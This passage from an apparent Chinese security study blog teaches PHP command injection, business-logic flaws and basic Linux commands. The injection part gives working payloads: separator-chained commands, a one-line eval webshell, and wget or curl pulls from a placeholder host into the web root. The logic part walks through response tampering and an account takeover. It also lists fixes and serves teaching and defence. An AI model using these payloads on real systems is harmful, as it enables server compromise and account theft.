&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping  <span class="hljs-subst">$arg</span>&quot;</span>);<br> &#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>  &gt; comm.php   在cmd中写入文件的命令<br><br>&amp;&amp;需要编码(%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>),浏览器不能识别<br><br>?cmd=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>  &gt; he.php<br>    如果双引号被过滤了,使用 ^ 可以代替双引号<br><br><br><br>?cmd=easdych||whoami<br><br>我们能够控制的点是程序的整个参数，我们可以直接用&amp;&amp;或||等等，利用与、或、管道命令来执行其他命令。<br>/?cmd=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>| ifconfig<br><span class="hljs-title function_ invoke__">System</span>(“ping –c <span class="hljs-number">3</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>; ifconfig)<br><br>Llinux 下支持分号 ”;”<br>|，||，%<span class="hljs-number">26</span>，%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>，<br>短路逻辑与  %<span class="hljs-number">26</span>%<span class="hljs-number">26</span> 前后两个参数，如果第一为假，第二个不判断<br>短路逻辑 或 ||前后两个参数，如果第一为真，第二个不判断<br><br></code></pre></td></tr></table></figure><h6 id="System-函数漏洞利用-3-—–查看目录"><a href="#System-函数漏洞利用-3-—–查看目录" class="headerlink" title="System()函数漏洞利用(3)—–查看目录"></a>System()函数漏洞利用(3)—–查看目录</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$arg</span>) &#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir \&quot;<span class="hljs-subst">$arg</span>\&quot;&quot;</span>);<br><br>  <span class="hljs-comment">// ls –al “”;ifconfig;”</span><br> &#125;<br><br><br><br>?cmd=./<span class="hljs-string">&quot;%26%26whoami||&quot;</span><br>?cmd=./<span class="hljs-string">&quot;|whoami||&quot;</span><br>    <br>?cmd=/home” ; ifconfig;”<br>?cmd=/home” || ifconfig;”<br>?cmd=/home” %<span class="hljs-number">26</span> ifconfig;”<br>?cmd=/home” %<span class="hljs-number">26</span>%<span class="hljs-number">26</span> ifconfig;”<br><br><br>一个 | --&gt;前面为真,就执行后面的<br></code></pre></td></tr></table></figure><h6 id="短路与逻辑"><a href="#短路与逻辑" class="headerlink" title="短路与逻辑"></a>短路与逻辑</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">短路与&amp;&amp;的特点，前面如果为真，才执行后面的，如果为假，后面不执行。<br><span class="hljs-comment">// 逻辑与&amp;的特点，前面无论真假，后面都执行,并且打印后面的值.</span><br><br><span class="hljs-comment">// 短路或||的特点，前面如果为真，后面的不执行了，前面为假，后面执行</span><br><span class="hljs-comment">// 逻辑或|前面为真，后面都执行,并且打印后面的值.</span><br></code></pre></td></tr></table></figure><p>?cmd =127.0.0.1;whoami</p><p><strong>命令分隔符：</strong></p><p><strong>在Linux上</strong>，上面的 ; 也可以用 |、|| 代替</p><blockquote><p>;前面的执行完执行后面的</p><p>|是管道符，显示后面的执行结果</p><p>||当前面的执行出错时执行后面的</p><p>可用**%0A**换行执行命令</p></blockquote><p><strong>在Windows上</strong>，不能用 ; 可以用&amp;、&amp;&amp;、|、||代替</p><blockquote><p>&amp;前面的语句为假则直接执行后面的</p><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行</p><p>|直接执行后面的语句</p><p>||前面出错执行后面的</p></blockquote><h6 id="System-函数漏洞利用-4-—–写文件"><a href="#System-函数漏洞利用-4-—–写文件" class="headerlink" title="System()函数漏洞利用(4)—–写文件"></a>System()函数漏洞利用(4)—–写文件</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$arg</span>) &#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo &#x27;<span class="hljs-subst">$arg</span>&#x27; &gt; 1.txt&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-number">123</span><span class="hljs-string">&#x27;|whoami||&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">在单引号内的话，变量不能被解析，因此要想执行命令必须闭合单引号。</span><br><span class="hljs-string">/cmd?= 12’|whoami||echo ‘</span><br></code></pre></td></tr></table></figure><h6 id="passthru-exec-shell-exec函数漏洞利用"><a href="#passthru-exec-shell-exec函数漏洞利用" class="headerlink" title="passthru/exec/shell_exec函数漏洞利用"></a>passthru/exec/shell_exec函数漏洞利用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);  ---不需要<span class="hljs-keyword">echo</span>,也有回显<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); ----需要<span class="hljs-keyword">echo</span>才有回显,否则没有回显<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-variable">$arr</span>);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$arr</span>);---可以用数组方式打印,也可以直接使用var_dump打印<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);---只能<span class="hljs-keyword">echo</span>打印,不能使用数组方式<br>    <br><span class="hljs-keyword">echo</span> `<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]`;  ---反引号也可以执行命令,只能<span class="hljs-keyword">echo</span>打印<br></code></pre></td></tr></table></figure><h6 id="proc-open函数漏洞利用"><a href="#proc-open函数漏洞利用" class="headerlink" title="proc_open函数漏洞利用"></a>proc_open函数漏洞利用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$des</span> = <span class="hljs-keyword">array</span>(<br>   <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  <span class="hljs-comment">// 标准输入，子进程从此管道中读取数据</span><br>   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  <span class="hljs-comment">// 标准输出，子进程向此管道中写入数据</span><br>   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;./error-output.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-comment">// 标准错误，写入到一个文件</span><br>);<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>], <span class="hljs-variable">$des</span>, <span class="hljs-variable">$pipes</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$pipes</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">stream_get_contents</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]); ----------只能<span class="hljs-keyword">echo</span>打印<br><span class="hljs-meta">?&gt;</span><br>    <br>    <br>如果有写权限的话<br><span class="hljs-number">1</span>、反弹shell，尝试提权<br><span class="hljs-number">2</span>、执行pwd得到绝对路径，写一句话木马：<br>?cmd=<span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()?^&gt; &gt; /<span class="hljs-keyword">var</span>/www/html/info.php <br>?cmd=wget -O /<span class="hljs-keyword">var</span>/www/html/info.php http:<span class="hljs-comment">//www.xx.com/phpinfo.txt</span><br>?cmd=curl http:<span class="hljs-comment">//www.xx.com/phpinfo.txt &gt; /var/www/html/info.php </span><br><br></code></pre></td></tr></table></figure><p><img src="image-20221013171434912.png"></p><h6 id="popen函数漏洞利用"><a href="#popen函数漏洞利用" class="headerlink" title="popen函数漏洞利用"></a>popen函数漏洞利用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-string">&#x27;r&#x27;</span>)  ------只能<span class="hljs-keyword">echo</span>打印<br><br><br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$f</span> =<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$x</span>,<span class="hljs-number">1024</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$f</span>;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">继承Web服务器程序的权限，去执行系统命令<br>继承Web服务器程序的权限，读写文件 <span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); ?^&gt; &gt; <span class="hljs-number">1</span>.php<br>反弹shell<br>控制整个网站<br>甚至控制整个服务器<br><br></code></pre></td></tr></table></figure><h4 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h4><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss">能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disable_functions中禁用。<br>在进入命令执行的函数或方法之前，对参数进行过滤。使用这些函数escapeshellcmd / escapeshellarg过滤<br>escapeshellarg — 把字符串转码为可以在 <span class="hljs-built_in">shell</span> 命令里使用的参数<br>escapeshellcmd  <span class="hljs-built_in">shell</span> 元字符转义<br>参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。<br><span class="hljs-built_in">exec</span>() 函数中数据，避免用户可控。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="/2022/10/10/ye-wu-luo-ji-lou-dong/"/>
    <url>/2022/10/10/ye-wu-luo-ji-lou-dong/</url>
    
    <content type="html"><![CDATA[<h1 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h1><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>逻辑漏洞是由于程序逻辑不严或者逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误。</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs">1.弱口令<br>2.暴力破解<br>3.验证码安全问题<br>4.接收端前端可控<br>5.重置凭证未校验<br>6.任意用户密码修改<br>7.越权访问<br>8.数据遍历<br>9.订单金额修改<br></code></pre></td></tr></table></figure><h5 id="1-弱口令"><a href="#1-弱口令" class="headerlink" title="1)弱口令"></a>1)弱口令</h5><p>弱口令没有严格和准确的定义，通常认为容易被别人猜测到或被破解工具破解的口令均为弱口令。</p><ul><li>例如：abc、123、123456、111111、admin、guest、test等 </li><li>除此之外，纯数字以及纯字母并且密码长度小于6位的口令也被称之为弱口令，理想情况下，以此作为密码的口令暴力破解工具只需要半天的时间就能成功破解密码。</li><li>在允许社会工程学攻击的情况下，密码中仅带有与自身相关的信息也可以称之为弱口令，如受害者为王伟，通过简单的社工信息收集到生日为19920801 那么以wangwei123、wangwei19920801、ww19920801、WangWei123此类的密码均被认为是弱口令。</li><li>另外，企业、CMS以及系统服务的默认口令也被认为是弱口令的一种。</li></ul><h5 id="2-暴力破解"><a href="#2-暴力破解" class="headerlink" title="2)暴力破解"></a>2)暴力破解</h5><p>手工尝试弱口令不行之后,可以结合字典与工具进行暴力破解,关键是拥有一个强大的字典,一个好用的工具</p><p>使用Burpsuite工具的intruder模块进行爆破,示例如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>if (isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]))&#123;<br>    if ($_GET[&#x27;username&#x27;] == &#x27;admin&#x27; &amp;&amp; $_GET[&#x27;password&#x27;] == &#x27;admin&#x27;)&#123;<br>        echo &quot;ok 登陆成功&quot;;<br>    &#125;<br>    else&#123;<br>        echo &quot;登陆失败,请重试&quot;;<br>    &#125;<br>&#125;<br><br>?&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form action=&quot;./login_brute.php&quot;&gt;<br>    用户名:&lt;input name=&quot;username&quot;&gt;<br>    密码:&lt;input name=&quot;password&quot;&gt;<br>    &lt;button value=&quot;submit&quot;&gt;提交&lt;/button&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="image-20221022095426081.png"></p><h6 id="3-验证码安全问题"><a href="#3-验证码安全问题" class="headerlink" title="3)验证码安全问题"></a>3)验证码安全问题</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">验证码前端可读<br>验证码前端可控<br>验证码前端验证<br>验证码可重复使用<br>验证码可爆破<br>验证码可被OCR识别<br>验证码和业务数据分别提交<br></code></pre></td></tr></table></figure><h6 id="4-接收端前端可控"><a href="#4-接收端前端可控" class="headerlink" title="4)接收端前端可控"></a>4)接收端前端可控</h6><p>修改回显包绕过验证:修改密码需要 手机\邮箱 验证码，可以用Burpsuite拦截响应包,修改响应包参数内容进行绕过(例如:no -&gt; yes   /  0 -&gt; 1)</p><h6 id="5-重置凭证未校验"><a href="#5-重置凭证未校验" class="headerlink" title="5)重置凭证未校验"></a>5)重置凭证未校验</h6><p>手机号、验证码、用户未统一验证问题</p><h6 id="6-任意用户密码修改"><a href="#6-任意用户密码修改" class="headerlink" title="6)任意用户密码修改"></a>6)任意用户密码修改</h6><ul><li>注册一个126邮箱测试帐号</li></ul><p>注册成功后会跳转到手机绑定的安全提示上：<a href="http://security.mail.126.com/mobileserv/mbp.do?uid=test@126.com&amp;backurl=">http://security.mail.126.com/mobileserv/mbp.do?uid=test@126.com&amp;backurl=</a></p><ul><li>将uid修改为其他任意用户的邮箱</li></ul><p>填入攻击者自己的手机号码，将收到短信，填入确认码，号码绑定成功。</p><ul><li>重置密码</li></ul><p>此时其他任意用户的邮箱已经被越权绑定了密保手机，然后走正常的密码取回流程，通过手机号重置密码，修改密码成功。</p><h6 id="7-越权访问"><a href="#7-越权访问" class="headerlink" title="7)越权访问"></a>7)越权访问</h6><p>越权访问（Broken Access Control, 简称BAC）。顾名思义，这类漏洞是指应用在检查授权（Authorization）时存在纰漏，使得攻击者可以利用一些方式绕过权限检查，访问或者操作到原本无权访问的代码或内容。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">平行越权：权限类型不变，ID改变<br>垂直越权：ID不变，权限类型改变<br>交叉越权：既改变ID，也改变权限<br></code></pre></td></tr></table></figure><h6 id="8-数据遍历"><a href="#8-数据遍历" class="headerlink" title="8)数据遍历"></a>8)数据遍历</h6><p>通过登录一个用户之后,去遍历用户ID,可以访问到不同用户的数据信息</p><h6 id="9-订单金额修改"><a href="#9-订单金额修改" class="headerlink" title="9)订单金额修改"></a>9)订单金额修改</h6><p>①可以修改数量是否可以修改为负数</p><p>②商品价格是否可以修改为负数</p><p>③运费是否可以修改为负数</p><p>④订单跳转接口是否可以修改支付金额，是否可以直接跳过交易成功环节</p><p>示例忘记密码:</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">思路:<br>存在账户(admin44),点击找回密码,输入相关信息,之后下一步.<br>在验证码中随便输入,然后开启抓包,点击下一步<br>抓到包之后,抓一个回应包<br>将回应包的 <span class="hljs-literal">no</span> 修改称为 <span class="hljs-literal">yes</span> 跳过验证<br>然后放包取消拦截,回到页面,点击下一步可以直接进行设置新密码<br></code></pre></td></tr></table></figure><p><img src="image-20221019112640985.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux基础知识</title>
    <link href="/2022/07/20/linux-ji-chu-zhi-shi/"/>
    <url>/2022/07/20/linux-ji-chu-zhi-shi/</url>
    
    <content type="html"><![CDATA[<h2 id="Linux基础命令"><a href="#Linux基础命令" class="headerlink" title="Linux基础命令"></a>Linux基础命令</h2><p>1.ls查看当前目录下的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>  <span class="hljs-comment">#查看</span><br><span class="hljs-built_in">ls</span> -ll<span class="hljs-comment">#查看详细信息</span><br><span class="hljs-built_in">ls</span> -al<span class="hljs-comment">#展开隐藏文件和详细信息</span><br><span class="hljs-built_in">ls</span> /home<br></code></pre></td></tr></table></figure><p>2.pwd打印当前路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span> 查看当前的工作目录<br></code></pre></td></tr></table></figure><p>3.切换路径</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-comment">#进入到家目录下</span><br><span class="hljs-keyword">cd</span> <span class="hljs-string">..</span><span class="hljs-comment">#返回上层目录</span><br><span class="hljs-keyword">cd</span> .<span class="hljs-comment">#当前目录不变</span><br><span class="hljs-keyword">cd</span> /<span class="hljs-comment">#进入到根目录下</span><br></code></pre></td></tr></table></figure><p>4.ifconfig查看网络信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ifconfig<span class="hljs-built_in">/ip </span><span class="hljs-built_in">add</span>#linux下查看ens33/网络<br></code></pre></td></tr></table></figure><p>5.free -h查看内存信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache">              <span class="hljs-attribute">total</span>        used        free      shared  buff/cache   available<br><span class="hljs-attribute">Mem</span>:           <span class="hljs-number">1</span>.<span class="hljs-number">8</span>G        <span class="hljs-number">135</span>M        <span class="hljs-number">1</span>.<span class="hljs-number">5</span>G        <span class="hljs-number">8</span>.<span class="hljs-number">6</span>M        <span class="hljs-number">177</span>M        <span class="hljs-number">1</span>.<span class="hljs-number">5</span>G<br><span class="hljs-attribute">Swap</span>:          <span class="hljs-number">2</span>.<span class="hljs-number">0</span>G          <span class="hljs-number">0</span>B        <span class="hljs-number">2</span>.<span class="hljs-number">0</span>G<br></code></pre></td></tr></table></figure><p>6.df -h查看存储信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span> -h<br></code></pre></td></tr></table></figure><p>7.touch创建文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> [name]<span class="hljs-comment">#创建文件</span><br><span class="hljs-built_in">touch</span> filename&#123;1..9&#125;[文件后缀]<span class="hljs-comment">#批量创建文件</span><br></code></pre></td></tr></table></figure><p>8.rm -rf 删除文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf [filename]<span class="hljs-comment">#删除文件(强制删除不提醒)</span><br><span class="hljs-built_in">rm</span> -rf *<span class="hljs-comment">#删除当前目录下的文件</span><br><span class="hljs-built_in">rm</span> -rf file*<span class="hljs-comment">#删除文件名为file为前缀的所有文件</span><br></code></pre></td></tr></table></figure><p>9.创建目录mkdir</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> filedir<span class="hljs-comment">#创建目录</span><br></code></pre></td></tr></table></figure><p>10.cp复制文件</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">cp oldfile <span class="hljs-keyword">new</span><span class="hljs-type">file</span><span class="hljs-meta">#将oldfile复制到本地并更名为newfile</span><br></code></pre></td></tr></table></figure><p>11.mv 移动或者重命名</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mv anaconda-ks<span class="hljs-selector-class">.cfg</span> anaconda-ks<span class="hljs-selector-class">.cfg</span><span class="hljs-selector-class">.bak</span>#重命名<br>mv anaconda-ks<span class="hljs-selector-class">.cfg</span><span class="hljs-selector-class">.bak</span> /tmp/test2022<span class="hljs-selector-class">.txt</span> #移动<br></code></pre></td></tr></table></figure><p>12.cat查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> [road1/road2/../]filename<span class="hljs-comment">#查看文件内容</span><br>more <span class="hljs-comment">#查看文件</span><br></code></pre></td></tr></table></figure><h1 id="shell的基本使用"><a href="#shell的基本使用" class="headerlink" title="shell的基本使用:"></a>shell的基本使用:</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看passwd,命令后缀:<br><span class="hljs-regexp">/bin/</span>bash  <span class="hljs-comment">#有的,说明是可以登录的.可以用于判断可疑账户</span><br></code></pre></td></tr></table></figure><h6 id="1-别名的使用"><a href="#1-别名的使用" class="headerlink" title="1.别名的使用"></a>1.别名的使用</h6><p>alias的效力仅及于该次登入的操作。若要每次登入是即自动设好别名，可在/etc/profile或自己的<del>/.bashrc中设定指令的别名。bashrc是环境变量的配置文件 /etc/bashrc和</del>/.bashrc 区别就在于一个是设置给全系统一个是设置给单用户使。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">alias</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">dir</span>=<span class="hljs-string">&#x27;ls -ll&#x27;</span> <span class="hljs-comment">#将dir命令修改称ls -ll命令</span><br><span class="hljs-built_in">unalias</span> <span class="hljs-built_in">dir</span>  <span class="hljs-comment">#撤销设置的alias</span><br></code></pre></td></tr></table></figure><h6 id="2-历史命令的使用"><a href="#2-历史命令的使用" class="headerlink" title="2.历史命令的使用"></a>2.历史命令的使用</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">↑        <span class="hljs-comment">#上滑查看历史命令</span><br>↓<span class="hljs-comment">#下滑查看历史命令</span><br><span class="hljs-built_in">history</span>  <span class="hljs-comment">#最多可以保存1000个,但是也可以设置,命令保存在主文件夹的bash_history</span><br><span class="hljs-built_in">ls</span> -al   <span class="hljs-comment">#查看所有文件包括隐藏文件</span><br><br><span class="hljs-built_in">history</span> [number]<span class="hljs-comment">#查看最近的number条历史命令</span><br><span class="hljs-built_in">history</span> -c  <span class="hljs-comment">#删除历史命令</span><br><span class="hljs-built_in">history</span> -w  <span class="hljs-comment">#将本次登录的命令写入命令历史文件中</span><br><span class="hljs-built_in">history</span> -r  <span class="hljs-comment">#将命令历史文件中的内容读入到目前shellde history记忆中</span><br><br></code></pre></td></tr></table></figure><h6 id="3-使用-执行历史命令"><a href="#3-使用-执行历史命令" class="headerlink" title="3.使用!执行历史命令"></a>3.使用!执行历史命令</h6><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">![<span class="hljs-built_in">number</span>] 执行第几行命令<br></code></pre></td></tr></table></figure><h6 id="4-定制history功能"><a href="#4-定制history功能" class="headerlink" 